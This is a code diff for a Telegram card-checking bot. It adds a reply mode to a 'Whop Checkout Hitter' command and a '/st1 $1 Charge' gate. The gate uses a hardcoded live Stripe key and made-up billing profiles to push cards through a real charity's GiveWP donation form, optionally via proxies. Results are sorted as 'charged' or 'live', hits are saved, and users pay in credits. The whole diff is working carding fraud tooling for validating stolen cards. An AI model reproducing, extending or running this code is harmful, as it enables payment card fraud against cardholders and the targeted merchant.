 async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Whop Checkout Hitter — /whop <url> <card1> <card2> ...
@@ -74401,7 +74802,9 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await message.reply_text(
             "💳 <b>Whop Checkout Hitter</b>\n\n"
-            "Usage: <code>/whop &lt;url&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
+            "Usage: <code>/whop &lt;url&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Reply: <b>reply</b> to a message with a Whop URL and send "
+            "<code>/whop &lt;card&gt;</code>\n\n"
             "Supported URL formats:\n"
             "• <code>https://whop.com/checkout/plan_XXX</code>\n"
             "• <code>https://store.whop.site/checkout/plan_XXX</code>\n"
@@ -74415,6 +74818,9 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
 
     # ── Find the URL ───────────────────────────────────────────────────
+    # 1) Inline in the command:   /whop <url> <card>
+    # 2) REPLIED message:         reply to a message containing a Whop URL
+    #                             with  /whop <card>   (URL comes from reply)
     checkout_url = None
     card_index = 0
     for i, arg in enumerate(args):
@@ -74423,9 +74829,20 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             card_index = i + 1
             break
 
+    if not checkout_url and message.reply_to_message:
+        replied_url = _whop_extract_url_from_message(message.reply_to_message)
+        if replied_url:
+            checkout_url = replied_url
+            card_index = 0  # every command arg is a card
+            print(f"🔗 [WHOP] Using URL from replied message: {checkout_url}")
+
     if not checkout_url:
         await message.reply_text(
-            "❌ <b>No valid Whop URL found</b>",
+            "❌ <b>No valid Whop URL found</b>\n\n"
+            "Send the URL with the command:\n"
+            "<code>/whop &lt;url&gt; &lt;card&gt;</code>\n\n"
+            "Or <b>reply</b> to a message containing a Whop URL with:\n"
+            "<code>/whop &lt;card&gt;</code>",
             parse_mode=ParseMode.HTML,
         )
         return
@@ -74438,13 +74855,6 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # ── Extract cards ──────────────────────────────────────────────────
     cards_text = " ".join(args[card_index:]) if card_index < len(args) else ""
-    if not cards_text:
-        await message.reply_text(
-            "❌ <b>No cards provided</b>\n\n"
-            "Card format: <code>cc|mm|yy|cvv</code>",
-            parse_mode=ParseMode.HTML,
-        )
-        return
 
     cards: List[str] = []
     for line in cards_text.strip().split("\n"):
@@ -74455,6 +74865,16 @@ async def whop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             card = card_formatter.extract_single_card_from_text(card_str)
             if card:
                 cards.append(card)
+
+    # Fallback: if the command had no cards, read them from the replied message
+    if not cards and message.reply_to_message:
+        replied_txt = (message.reply_to_message.text
+                       or message.reply_to_message.caption or "")
+        if replied_txt:
+            for card_str in replied_txt.split():
+                card = card_formatter.extract_single_card_from_text(card_str)
+                if card:
+                    cards.append(card)
 
     if not cards:
         await message.reply_text(
@@ -76783,6 +77203,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "B3Charged": b3charged_active_tasks,
         "Adyen Direct": adyen_direct_active_tasks,
         "Auto Stripe": auto_stripe_active_tasks,
+        "ST1 $1 Charge": st1_charge_active_tasks,
         "MSH Shopify": msh_active_tasks if 'msh_active_tasks' in globals() else {},
     }
     
@@ -77205,9 +77626,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         '/ay':   'adyen',
         '/may':  'adyen',
 
-        # ST1
-        '/st1':   'st1',
-        '/mst1':  'st1',
+        # ST1 $1 Charge
+        '/st1':   'st1_charge',
+        '/mst1':  'st1_charge',
 
         # Stripe PL
         '/ct':   'stripe_pl',
@@ -77467,6 +77888,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
             context.args = [card]
             asyncio.create_task(single_check_boutique_api(update, context))
 
+        elif gateway == 'st1_charge':
+            asyncio.create_task(single_check_st1_charge_logic(update, context, card))
+
         elif gateway == 'st1':
             context.args = [card]
             asyncio.create_task(single_check_st1(update, context))
@@ -77508,6 +77932,7 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         'dabbagh_stripe':    'Stripe $1',
         'boutique':          'Boutique Stripe',
         'st1':               'ST1 Auth',
+        'st1_charge':        'Charge  $1',
         'ezycourse':         'EzyCourse',
         'stripe_pl':         'Stripe PL',
         'square_1usd':       'Square 1$',
@@ -77580,6 +78005,8 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(dabbagh_mass_check_logic(update, context, cards, progress_msg))
     elif gateway == 'boutique':
         asyncio.create_task(mass_check_boutique_logic(update, context, cards, progress_msg))
+    elif gateway == 'st1_charge':
+        asyncio.create_task(mass_check_st1_charge_logic(update, context, cards, progress_msg))
     elif gateway == 'st1':
         asyncio.create_task(mass_check_st1_logic(update, context, cards, progress_msg))
     elif gateway in ('bt_kaffn8', 'bt'):
@@ -81905,7 +82332,8 @@ async def reply_with_command_router(update: Update, context: ContextTypes.DEFAUL
         '/stamc', '/stamcheck', '/sta',
         '/btnm', '/btmcheck', '/btn',
         '/pfmc', '/pfmcheck', '/pf',
-        '/sc', '/msc'
+        '/sc', '/msc',
+        '/st1', '/mst1'
     ]
     
     first_word = command_text.split()[0] if command_text else ''
@@ -84372,6 +84800,831 @@ async def shutdown():
     
     
 
+# ═══════════════════════════════════════════════════════════════════════
+#  ST1 $1 CHARGE GATE  (GiveWP / Stripe donation)  —  /st1  &  /mst1
+#  Extracted from the standalone "Stripe Multi-Gate" tool ($1 charge gate).
+# ═══════════════════════════════════════════════════════════════════════
+
+st1_charge_active_tasks = {}
+
+ST1_CHARGE_CFG = {
+    "stripe_key":      "pk_live_51OmjsXJ2oe8RRzALRXjWkYpWBLAGWpJws2lCXnwBQuYFDoV9y1ZDS7MEuRYarKvhKYb9Rj7mlJOyOOUzP5WNARMD0095CooLuR",
+    "form_id":         "401",
+    "site_url":        "https://acefonline.org",
+    "donate_url":      "https://acefonline.org/donate/",
+    "amount":          "1.00",
+    "currency":        "USD",
+    "billing_country": "US",
+    "user_agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7871.184 Safari/537.36",
+    "connect_timeout": 15,
+    "read_timeout":    25,
+}
+
+ST1_CHARGE_DECLINE_CODES = {
+    "generic_decline": "GENERIC_DECLINE",
+    "insufficient_funds": "INSUFFICIENT_FUNDS",
+    "bank_insufficient_funds": "INSUFFICIENT_FUNDS",
+    "lost_card": "LOST_CARD",
+    "stolen_card": "STOLEN_CARD",
+    "expired_card": "EXPIRED_CARD",
+    "incorrect_cvc": "INCORRECT_CVC",
+    "invalid_cvc": "INVALID_CVC",
+    "incorrect_number": "INCORRECT_NUMBER",
+    "invalid_number": "INVALID_NUMBER",
+    "incorrect_zip": "INCORRECT_ZIP",
+    "incorrect_zip_code": "INCORRECT_ZIP",
+    "incorrect_address": "INCORRECT_ADDRESS",
+    "card_not_supported": "CARD_NOT_SUPPORTED",
+    "currency_not_supported": "CURRENCY_NOT_SUPPORTED",
+    "do_not_honor": "DO_NOT_HONOR",
+    "fraudulent": "FRAUDULENT",
+    "merchant_blacklist": "MERCHANT_BLACKLIST",
+    "pickup_card": "PICKUP_CARD",
+    "restricted_card": "RESTRICTED_CARD",
+    "security_violation": "SECURITY_VIOLATION",
+    "service_not_allowed": "SERVICE_NOT_ALLOWED",
+    "stop_payment_order": "STOP_PAYMENT_ORDER",
+    "testmode_decline": "TESTMODE_DECLINE",
+    "transaction_not_allowed": "TRANSACTION_NOT_ALLOWED",
+    "try_again_later": "TRY_AGAIN_LATER",
+    "withdrawal_count_limit_exceeded": "WITHDRAWAL_LIMIT",
+    "invalid_account": "INVALID_ACCOUNT",
+    "new_account_information_available": "NEW_ACCOUNT_INFO",
+    "no_account": "NO_ACCOUNT",
+    "not_permitted": "NOT_PERMITTED",
+    "processing_error": "PROCESSING_ERROR",
+    "reenter_transaction": "REENTER_TRANSACTION",
+    "revocation_of_all_authorizations": "AUTH_REVOKED",
+    "revocation_of_authorization": "AUTH_REVOKED",
+    "authentication_required": "3DS_REQUIRED",
+    "card_velocity_exceeded": "VELOCITY_EXCEEDED",
+    "duplicate_transaction": "DUPLICATE_TRANSACTION",
+    "invalid_amount": "INVALID_AMOUNT",
+    "invalid_expiry_month": "INVALID_EXPIRY_MONTH",
+    "invalid_expiry_year": "INVALID_EXPIRY_YEAR",
+    "issuer_not_available": "ISSUER_UNAVAILABLE",
+    "offline_pin_required": "OFFLINE_PIN_REQUIRED",
+    "online_or_offline_pin_required": "PIN_REQUIRED",
+    "pin_try_exceeded": "PIN_TRIES_EXCEEDED",
+    "refer_to_card_issuer": "REFER_TO_ISSUER",
+    "call_issuer": "CALL_ISSUER",
+    "approved": "APPROVED",
+    "card_declined": "CARD_DECLINED",
+    "expired": "EXPIRED_CARD",
+}
+
+ST1_CHARGE_LIVE_CODES = {
+    "INSUFFICIENT_FUNDS", "INCORRECT_CVC", "INVALID_CVC",
+    "INCORRECT_ZIP", "INCORRECT_ADDRESS",
+    "DO_NOT_HONOR", "RESTRICTED_CARD", "VELOCITY_EXCEEDED",
+    "WITHDRAWAL_LIMIT", "SECURITY_VIOLATION", "NOT_PERMITTED",
+    "TRY_AGAIN_LATER", "REFER_TO_ISSUER", "CALL_ISSUER",
+}
+
+ST1_CHARGE_FIRST = [
+    "James", "John", "Robert", "Michael", "David", "William", "Richard",
+    "Thomas", "Daniel", "Matthew", "Christopher", "Anthony", "Mark",
+    "Donald", "Steven", "Paul", "Andrew", "Joshua", "Kenneth", "Kevin",
+]
+ST1_CHARGE_LAST = [
+    "Smith", "Johnson", "Williams", "Brown", "Jones", "Davis", "Miller",
+    "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin",
+    "Lee", "Thompson", "White", "Harris", "Clark", "Lewis",
+]
+ST1_CHARGE_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"]
+ST1_CHARGE_CITIES = {
+    "TX": ["Houston", "Dallas", "Austin", "San Antonio"],
+    "CA": ["Los Angeles", "San Francisco", "San Diego", "Sacramento"],
+    "FL": ["Miami", "Orlando", "Tampa", "Jacksonville"],
+    "NY": ["New York", "Buffalo", "Rochester", "Syracuse"],
+    "IL": ["Chicago", "Springfield", "Peoria", "Rockford"],
+    "WA": ["Seattle", "Spokane", "Tacoma", "Vancouver"],
+    "MA": ["Boston", "Cambridge", "Worcester", "Springfield"],
+    "CO": ["Denver", "Aurora", "Colorado Springs", "Fort Collins"],
+}
+ST1_CHARGE_ZIPS = {
+    "TX": ["77001", "75201", "78701", "78201"],
+    "CA": ["90001", "94102", "92101", "95814"],
+    "FL": ["33101", "32801", "33601", "32202"],
+    "NY": ["10001", "14201", "14601", "13202"],
+    "IL": ["60601", "62701", "61601", "61101"],
+    "WA": ["98101", "99201", "98402", "98660"],
+    "MA": ["02108", "02139", "01601", "01103"],
+    "CO": ["80202", "80010", "80903", "80521"],
+}
+ST1_CHARGE_STREETS = [
+    "123 Main St", "456 Oak Ave", "789 Park Dr", "321 Elm St", "654 Maple Ln",
+    "987 Cedar Rd", "147 Birch Way", "258 Spruce Ct", "369 Walnut St", "741 Chestnut Blvd",
+]
+
+
+def _st1_charge_profile() -> Dict[str, str]:
+    """Random US billing profile for the GiveWP donation form."""
+    st = random.choice(list(ST1_CHARGE_CITIES.keys()))
+    f = random.choice(ST1_CHARGE_FIRST)
+    l = random.choice(ST1_CHARGE_LAST)
+    return {
+        "first": f,
+        "last": l,
+        "email": f"{f.lower()}{l.lower()}{random.randint(100, 9999)}@{random.choice(ST1_CHARGE_DOMAINS)}",
+        "street": random.choice(ST1_CHARGE_STREETS),
+        "city": random.choice(ST1_CHARGE_CITIES[st]),
+        "state": st,
+        "zip": random.choice(ST1_CHARGE_ZIPS[st]),
+        "country": "US",
+    }
+
+
+def _st1_charge_extract_decline_code(err) -> Tuple[str, str]:
+    """Map a Stripe error object to (mapped_code, message)."""
+    if not isinstance(err, dict):
+        return "UNKNOWN", "Unknown error"
+    code_raw = err.get("decline_code") or err.get("code")
+    if code_raw:
+        return ST1_CHARGE_DECLINE_CODES.get(code_raw, str(code_raw).upper()), err.get("message", code_raw)
+    msg = err.get("message", "Declined")
+    low = msg.lower()
+    for k, mapped in ST1_CHARGE_DECLINE_CODES.items():
+        if k.replace("_", " ") in low:
+            return mapped, msg
+    if "insufficient" in low:
+        return "INSUFFICIENT_FUNDS", msg
+    if "do not honor" in low:
+        return "DO_NOT_HONOR", msg
+    if "expired" in low:
+        return "EXPIRED_CARD", msg
+    if "cvc" in low or "cvv" in low:
+        return "INCORRECT_CVC", msg
+    if "fraud" in low:
+        return "FRAUDULENT", msg
+    if "3ds" in low or "authentication" in low:
+        return "3DS_REQUIRED", msg
+    return "UNKNOWN", msg
+
+
+def _st1_charge_parse_html(text: str) -> Tuple[str, str, str]:
+    """Parse the GiveWP donation response HTML → (status, message, code)."""
+    low = text.lower()
+    err_msg = ""
+    err_code = ""
+    for pat in [
+        r'<div[^>]*class="[^"]*(?:give_error|give_notice error)[^"]*"[^>]*>.*?<p[^>]*>(.*?)</p>',
+        r'id="give_error_stripe_payment_intent_error".*?<p>(.*?)</p>',
+        r'<div class="give_errors".*?<p class="give_error_message">(.*?)</p>',
+        r'<p><strong>Error</strong>:\s*(.*?)</p>',
+    ]:
+        m = re.search(pat, text, re.S | re.I)
+        if m:
+            err_msg = re.sub(r"<[^>]+>", "", m.group(1)).strip()
+            break
+
+    cm = re.search(r'(?:decline[_\s]?code|code)["\']?\s*[:=]\s*["\']?([a-z_]+)', low)
+    if cm:
+        err_code = ST1_CHARGE_DECLINE_CODES.get(cm.group(1), cm.group(1).upper())
+
+    if not err_msg:
+        for kw in ["declined", "insufficient", "expired", "incorrect cvc",
+                   "do not honor", "fraud", "failed"]:
+            if kw in low:
+                err_msg = kw.title()
+                break
+
+    if err_msg:
+        check = err_msg.lower()
+        if "insufficient" in check:
+            return "APPROVED", err_msg, "INSUFFICIENT_FUNDS"
+        if any(k in check for k in ["cvc", "security code", "zip", "postal", "do not honor"]):
+            return "APPROVED", err_msg, "INCORRECT_CVC"
+        if any(k in check for k in ["3ds", "3d secure", "authenticate", "authentication", "challenge"]):
+            return "3DS", err_msg, "3DS_REQUIRED"
+        return "DECLINED", err_msg, err_code or "CARD_DECLINED"
+
+    for kw in ["thank you", "donation confirmed", "donation received", "receipt",
+               "payment completed", "donation successful", "payment received"]:
+        if kw in low:
+            return "CHARGED", f"Donation Charged ${ST1_CHARGE_CFG['amount']}", "APPROVED"
+
+    return "DECLINED", "Transaction Declined / Incomplete", "CARD_DECLINED"
+
+
+async def check_card_st1_charge(card, proxy_str: str = None) -> Dict:
+    """
+    Run ONE card through the ST1 $1 GiveWP charge gate.
+    Returns dict: status / response / code / time / status_category.
+    """
+    start = time.perf_counter()
+    cfg = ST1_CHARGE_CFG
+    result = {
+        "status": "ERROR",
+        "response": "Unknown",
+        "code": "",
+        "time": 0,
+        "status_category": "declined",
+        "gateway": "ST1 $1",
+        "price": "$1.00",
+    }
+
+    # Normalise card → cc|mm|yy|cvv
+    if isinstance(card, dict):
+        card_str = f"{card.get('cc','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}"
+    else:
+        card_str = str(card)
+
+    parts = card_str.split("|")
+    if len(parts) != 4 or not parts[0].isdigit():
+        result["response"] = "Invalid card format"
+        result["time"] = round(time.perf_counter() - start, 2)
+        return result
+
+    number, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
+    if len(year) == 4:
+        year = year[2:]
+
+    profile = _st1_charge_profile()
+
+    proxy_url = None
+    if proxy_str:
+        try:
+            proxy_url = format_proxy_stco(proxy_str)
+        except Exception:
+            proxy_url = None
+
+    client_kwargs = {
+        "timeout": httpx.Timeout(cfg["read_timeout"], connect=cfg["connect_timeout"]),
+        "verify": False,
+        "follow_redirects": True,
+        "headers": {"User-Agent": cfg["user_agent"]},
+    }
+    if proxy_url:
+        client_kwargs["proxy"] = proxy_url
+
+    try:
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            # ── 1) Create Stripe payment method ────────────────────────
+            pm_payload = {
+                "type": "card",
+                "billing_details[name]": f"{profile['first']} {profile['last']}",
+                "billing_details[email]": profile["email"],
+                "billing_details[address][line1]": profile["street"],
+                "billing_details[address][city]": profile["city"],
+                "billing_details[address][state]": profile["state"],
+                "billing_details[address][postal_code]": profile["zip"],
+                "billing_details[address][country]": profile["country"],
+                "card[number]": number,
+                "card[cvc]": cvv,
+                "card[exp_month]": month,
+                "card[exp_year]": year,
+                "guid": str(uuid.uuid4()),
+                "muid": str(uuid.uuid4()),
+                "sid": str(uuid.uuid4()),
+                "pasted_fields": "number",
+                "payment_user_agent": "stripe.js/5f12795ce5; stripe-js-v3/5f12795ce5; card-element",
+                "referrer": cfg["site_url"],
+                "time_on_page": str(random.randint(10000, 60000)),
+                "key": cfg["stripe_key"],
+            }
+            r = await client.post(
+                "https://api.stripe.com/v1/payment_methods",
+                headers={
+                    "accept": "application/json",
+                    "content-type": "application/x-www-form-urlencoded",
+                    "origin": "https://js.stripe.com",
+                    "referer": "https://js.stripe.com/",
+                },
+                data=pm_payload,
+            )
+            try:
+                data = r.json()
+            except Exception:
+                data = {}
+
+            if isinstance(data, dict) and "error" in data:
+                code, msg = _st1_charge_extract_decline_code(data["error"])
+                if code in ST1_CHARGE_LIVE_CODES:
+                    status, cat = "APPROVED", "approved"
+                elif code == "3DS_REQUIRED":
+                    status, cat = "3DS", "3ds"
+                else:
+                    status, cat = "DECLINED", "declined"
+                result.update(status=status, response=msg, code=code, status_category=cat)
+                result["time"] = round(time.perf_counter() - start, 2)
+                return result
+
+            pm_id = data.get("id") if isinstance(data, dict) else None
+            if not pm_id:
+                result.update(status="ERROR", response="No payment method id", status_category="declined")
+                result["time"] = round(time.perf_counter() - start, 2)
+                return result
+
+            # ── 2) Fetch the donation form hash ────────────────────────
+            form_hash = None
+            form_id = cfg["form_id"]
+            try:
+                fr = await client.get(cfg["donate_url"])
+                mh = re.search(r'name="give-form-hash"\s+value="([^"]+)"', fr.text, re.I)
+                mi = re.search(r'name="give-form-id"\s+value="([^"]+)"', fr.text, re.I)
+                if mh:
+                    form_hash = mh.group(1)
+                if mi:
+                    form_id = mi.group(1)
+            except Exception as e:
+                result.update(status="ERROR", response=f"Form fetch: {str(e)[:60]}", status_category="declined")
+                result["time"] = round(time.perf_counter() - start, 2)
+                return result
+
+            if not form_hash:
+                result.update(status="ERROR", response="No form hash", status_category="declined")
+                result["time"] = round(time.perf_counter() - start, 2)
+                return result
+
+            # ── 3) Submit the donation (charge) ────────────────────────
+            amount = cfg["amount"]
+            body = {
+                "give-fee-amount": "0.34", "give-fee-mode-enable": "false",
+                "give-fee-status": "enabled", "give-honeypot": "",
+                "give-form-id-prefix": f"{form_id}-1",
+                "give-form-id": form_id,
+                "give-form-title": "Support the Anti-Counterfeiting Educational Foundation",
+                "give-current-url": cfg["donate_url"],
+                "give-form-url": cfg["donate_url"],
+                "give-form-minimum": "0.00", "give-form-maximum": "100000.00",
+                "give-form-hash": form_hash, "give-price-id": "custom",
+                "give-recurring-logged-in-only": "", "give-logged-in-only": "1",
+                "_give_is_donation_recurring": "0",
+                "give_recurring_donation_details": json.dumps({"give_recurring_option": "yes_donor"}),
+                "give-amount": amount, "give-radio-donation-level": "custom",
+                "give-recurring-period-donors-choice": "month",
+                "give_stripe_payment_method": pm_id,
+                "give-fee-recovery-settings": json.dumps({
+                    "fee_data": {"all_gateways": {"percentage": "2.900000", "base_amount": "0.300000",
+                        "give_fee_disable": False, "give_fee_status": True, "is_break_down": True, "maxAmount": "0"}},
+                    "give_fee_status": True, "give_fee_disable": False, "is_break_down": True,
+                    "fee_mode": "donor_opt_in", "is_fee_mode": True, "fee_recovery": True,
+                }),
+                "payment-mode": "stripe",
+                "give_first": profile["first"].lower(), "give_last": profile["last"].lower(),
+                "give_company_option": "no", "give_company_name": "",
+                "give_email": profile["email"], "give_comment": "",
+                "card_name": f"{profile['first']} {profile['last']}",
+                "billing_country": profile["country"],
+                "card_address": profile["street"], "card_address_2": "",
+                "card_city": profile["city"], "card_state": profile["state"], "card_zip": profile["zip"],
+                "give_action": "purchase", "give-gateway": "stripe",
+            }
+            cr = await client.post(
+                f"{cfg['donate_url']}?payment-mode=stripe&form-id={form_id}",
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Origin": cfg["site_url"],
+                    "Referer": (
+                        f"{cfg['donate_url']}?form-id={form_id}"
+                        f"&payment-mode=stripe&level-id=custom&custom-amount={amount}"
+                    ),
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
+                    "Accept-Language": "en-US,en;q=0.9",
+                },
+                data=body,
+            )
+
+            status, msg, code = _st1_charge_parse_html(cr.text)
+            cat = {"CHARGED": "charged", "APPROVED": "approved", "3DS": "3ds"}.get(status, "declined")
+            result.update(status=status, response=msg, code=code, status_category=cat)
+            result["time"] = round(time.perf_counter() - start, 2)
+            return result
+
+    except Exception as e:
+        result.update(status="ERROR", response=f"{type(e).__name__}: {str(e)[:80]}", status_category="declined")
+        result["time"] = round(time.perf_counter() - start, 2)
+        return result
+
+
+def format_st1_charge_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format an ST1 $1 charge result — Shopify-style premium emoji layout."""
+    try:
+        bin_info_text, bank, country, _cc, _ccode = bin_info
+    except Exception:
+        bin_info_text, bank, country = "N/A", "N/A", "N/A"
+
+    status_category = result.get("status_category", "declined")
+    message = result.get("response") or result.get("message") or "Unknown"
+
+    # ── Premium emoji helpers (same IDs as the Shopify formatter) ───
+    def pe(eid: str, fallback: str) -> str:
+        try:
+            return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'
+        except Exception:
+            return fallback
+
+    # ── Clean the response message ──────────────────────────────────
+    clean_response = re.sub(r'<[^>]+>', '', str(message))
+    clean_response = re.sub(r'\s+', ' ', clean_response).strip()
+    if len(clean_response) > 100:
+        clean_response = clean_response[:97] + "..."
+
+    # ── Card ────────────────────────────────────────────────────────
+    parts = card.split("|")
+    card_num = parts[0] if len(parts) > 0 else card
+    mm = parts[1] if len(parts) > 1 else "XX"
+    yy = parts[2] if len(parts) > 2 else "XX"
+    yy = yy[-2:] if len(yy) == 4 else yy
+    cvv = parts[3] if len(parts) > 3 else "XXX"
+    card_display = f"{card_num}|{mm}|{yy}|{cvv}"
+
+    # ── Bank ────────────────────────────────────────────────────────
+    bank_display = bank if bank and bank != 'N/A' else "Unknown"
+    if len(bank_display) > 30:
+        bank_display = bank_display[:27] + "..."
+
+    # ── Country ─────────────────────────────────────────────────────
+    country_name = str(country).replace('🌐', '').strip() if country else "Unknown"
+    if any(ch in country_name for ch in "🇦🇧🇨🇩🇪🇫🇬🇭🇮🇯🇰🇱🇲🇳🇴🇵🇶🇷🇸🇹🇺🇻🇼🇽🇾🇿"):
+        country_display = country_name
+    else:
+        flag_map = {
+            'USA': '🇺🇸', 'UNITED STATES': '🇺🇸',
+            'UK': '🇬🇧', 'UNITED KINGDOM': '🇬🇧',
+            'CANADA': '🇨🇦', 'AUSTRALIA': '🇦🇺',
+            'INDIA': '🇮🇳', 'UAE': '🇦🇪',
+            'MALAYSIA': '🇲🇾', 'SINGAPORE': '🇸🇬',
+            'THAILAND': '🇹🇭', 'INDONESIA': '🇮🇩',
+            'PHILIPPINES': '🇵🇭', 'VIETNAM': '🇻🇳',
+            'MOZAMBIQUE': '🇲🇿',
+        }
+        flag = "🌍"
+        for k, v in flag_map.items():
+            if k in country_name.upper():
+                flag = v
+                break
+        country_display = f"{flag}  {country_name}"
+
+    # ── Response icon ───────────────────────────────────────────────
+    _sc = str(status_category).lower()
+    resp_icon = pe("5902002809573740949", "✅") if any(
+        k in _sc for k in ("approved", "charged", "success", "live")
+    ) else ("❌" if "declin" in _sc else "⚠️")
+
+    ui = (
+        f"<b>Charge  $1</b> {pe('5895770017458294953', '💫')}\n\n"
+        f"{pe('5893494861612455015', '⭐️')} 𝗖𝗔𝗥𝗗 ↣ <code>{card_display}</code>\n\n"
+        f"{resp_icon} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ↣ <code>{clean_response}</code>\n"
+        f"{pe('6039802097916974085', '🪙')} 𝗣𝗿𝗶𝗰𝗲 ↣ <b>$1.00</b>\n\n"
+        f"{pe('5902242339899838759', '🌐')} 𝗕𝗜𝗡 ↣ <b>{bin_info_text}</b>\n"
+        f"{pe('6041705726206808304', '🚀')} 𝗕𝗮𝗻𝗸 ↣ <b>{bank_display}</b>\n"
+        f"{pe('5904542823167824187', '🗑')} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↣ <b>{country_display}</b>"
+    )
+    return ui, status_category
+
+
+@check_gateway("st1_charge")
+async def single_check_st1_charge(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check via the ST1 $1 GiveWP charge gate — /st1 <card>"""
+    if not await verify_group_access(update, context):
+        return
+
+    message = update.effective_message
+
+    # If this /st1 is a reply to another message, the reply handler
+    # (handle_reply_with_command, group=1) owns it — bail so it isn't checked twice.
+    if message and message.reply_to_message:
+        return
+
+    if not context.args:
+        await message.reply_text(
+            "💎 <b>ST1 $1 Charge Gateway</b>\n\n"
+            "Usage: <code>/st1 &lt;card&gt;</code>\n"
+            "Example: <code>/st1 4242424242424242|12|2029|123</code>\n\n"
+            "💰 Amount: $1.00\n"
+            "📍 Gateway: GiveWP / Stripe\n"
+            "✅ Charged, CVV Live, Insufficient Funds, 3D Secure",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    card = card_formatter.extract_single_card_from_text(" ".join(context.args).strip())
+    if not card:
+        await message.reply_text("❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV")
+        return
+
+    await single_check_st1_charge_logic(update, context, card)
+
+
+async def single_check_st1_charge_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str):
+    """Core single-card ST1 $1 charge check (shared by /st1 and the reply router)."""
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    # Credits (1 credit per check for free-tier users)
+    can_proceed, err = await check_and_deduct_credits(
+        user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(err, parse_mode=ParseMode.HTML)
+        return
+
+    # Gateway access
+    if not user_manager.can_access_gateway(user_id, 'st1_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ ST1 $1 not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML)
+        add_user_credits(user_id, 1)
+        return
+
+    tier = user_manager.get_tier(user_id)
+    st1_charge_active_tasks[user_id] = True
+    status_msg = await message.reply_text("🔄 Checking card with ST1 $1...")
+
+    try:
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and \
+               autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_str = autosopi_proxy_tracker.working_proxies[user_id][0]
+
+        result = await check_card_st1_charge(card, proxy_str)
+        bin_info = await get_bin_info(card)
+        ui, status_category = format_st1_charge_response(result, card, bin_info)
+
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if status_category in ("charged", "approved"):
+            await save_hit_to_file(
+                card=card, gateway="ST1 $1",
+                response=result.get("response", "Approved"),
+                price="$1.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier)
+
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="ST1 $1", card=card,
+                    response=result.get("response", "Charged"),
+                    price="$1.00",
+                    user=user_data, bin_info=bin_info, status_category="charged")
+                user_manager.increment_hits(user_id)
+
+        user_manager.increment_checks(user_id)
+
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except Exception:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [ST1 $1] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        st1_charge_active_tasks.pop(user_id, None)
+
+
+@check_gateway("st1_charge")
+async def mass_check_st1_charge_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check via the ST1 $1 GiveWP charge gate — /mst1"""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    # If this /mst1 is a reply to another message, the reply handler
+    # (handle_reply_with_command, group=1) owns it — bail so it isn't checked twice.
+    if message and message.reply_to_message:
+        return
+
+    if user_id in st1_charge_active_tasks:
+        await message.reply_text(
+            "⚠️ You already have an active ST1 $1 session.\n"
+            "Please wait for it to finish or use /stop to cancel.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    if not user_manager.can_access_gateway(user_id, 'st1_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ ST1 $1 not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use <code>/st1 &lt;card&gt;</code> for single checks.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>ST1 $1 Mass Check</b>\n\n"
+            "Usage: <code>/mst1 &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mst1\n\n"
+            "💰 Amount: $1.00\n"
+            "✅ Only charged/approved cards will be shown",
